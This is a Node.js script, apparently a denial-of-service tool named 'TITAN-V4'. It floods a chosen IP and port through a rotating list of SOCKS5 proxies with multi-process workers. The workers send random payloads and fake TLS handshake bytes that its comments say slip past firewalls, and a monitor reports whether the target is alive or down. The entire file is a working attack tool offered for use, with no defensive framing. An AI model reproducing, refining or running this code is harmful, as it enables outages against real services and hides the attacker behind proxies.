const net = require("net");
const cluster = require("cluster");
const fs = require("fs");
const crypto = require("crypto");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

// All error suppressions (Like CLOUDFLARE.js)
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const target_ip = process.argv[2];
const target_port = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const proxyFile = process.argv[6];

if (cluster.isMaster) {
    console.log(`\x1b[35m[TITAN-V4]\x1b[0m 🔱 DEPLOYING EXTREME L4 ENGINE`);
    let totalPackets = 0;

    for (let i = 0; i < threads; i++) {
        const worker = cluster.fork();
        worker.on('message', () => { totalPackets += 50; }); // Bulk count
    }

    // --- LIVE STATUS & MONITORING (Every 2 Seconds) ---
    const monitor = setInterval(() => {
        const s = net.connect(target_port, target_ip, () => {
            console.log(`\x1b[32m[${new Date().toLocaleTimeString()}]\x1b[0m STATUS: \x1b[1mALIVE\x1b[0m | PPS: \x1b[36m${totalPackets}\x1b[0m`);
            s.destroy();
        });

        s.on('error', () => {
            console.log(`\x1b[31m[${new Date().toLocaleTimeString()}]\x1b[0m STATUS: \x1b[1mDOWN/FILTERED\x1b[0m | PPS: \x1b[36m${totalPackets}\x1b[0m`);
            s.destroy();
        });
        s.setTimeout(1000, () => s.destroy());
    }, 2000);

    setTimeout(() => { process.exit(); }, duration * 1000);

} else {
    const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(Boolean);

    function attack() {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
        
        // Advanced Socket configuration
        const socket = net.connect({
            host: proxy[0],
            port: proxy[1],
            allowHalfOpen: true
        });

        socket.setNoDelay(true);
        socket.setKeepAlive(true, 600000);

        socket.on('connect', () => {
            socket.write(Buffer.from([0x05, 0x01, 0x00])); // SOCKS5 Greeting
        });

        socket.on('data', (data) => {
            if (data[0] === 0x05) {
                // SOCKS5 Connect to Target
                const connectReq = Buffer.concat([
                    Buffer.from([0x05, 0x01, 0x00, 0x03]),
                    Buffer.from([target_ip.length]),
                    Buffer.from(target_ip),
                    Buffer.from([(target_port >> 8) & 0xFF, target_port & 0xFF])
                ]);
                socket.write(connectReq);

                // --- POWER MULTIPLEXER LOOP ---
                const flood = () => {
                    if (!socket.writable) return;

                    // Sending 50 mixed-logic packets at once (Like HTTP/2 Pipelining)
                    for(let i = 0; i < 50; i++) {
                        // 1. Random Binary Payload
                        socket.write(crypto.randomBytes(Math.floor(Math.random() * 512) + 128));
                        
                        // 2. Fake SSL/TLS Handshake signature (Bypasses many L4 firewalls)
                        socket.write(`\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03${crypto.randomBytes(32).toString('hex')}`);
                    }
                    
                    process.send('count');
                    setImmediate(flood); 
                };
                flood();
            }
        });

        socket.on('error', () => socket.destroy());
        setTimeout(() => socket.destroy(), 900000);
    }

    setInterval(attack, 1); // Max frequency
}
